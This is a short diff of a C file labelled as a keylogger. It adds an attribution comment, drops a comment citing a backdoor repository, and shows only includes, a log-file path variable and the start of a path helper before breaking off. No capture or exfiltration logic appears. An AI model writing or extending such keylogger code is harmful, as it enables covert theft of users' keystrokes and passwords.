@@ -1,9 +1,15 @@
+/*
+Keylogger 
+Based on the implementation by abhijithb200
+Original source: https://github.com/abhijithb200/Keylogger/blob/main/keylogger.c
+With modifications
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
 #include <winkeylog.h>
-// modified from https://github.com/chankruze/backdoor/blob/master/libs/keylogger.h
 char KEY_LOG_FILE[MAX_PATH];
 void getPath(char* outPath, size_t size) {
     char tempPath[MAX_PATH];
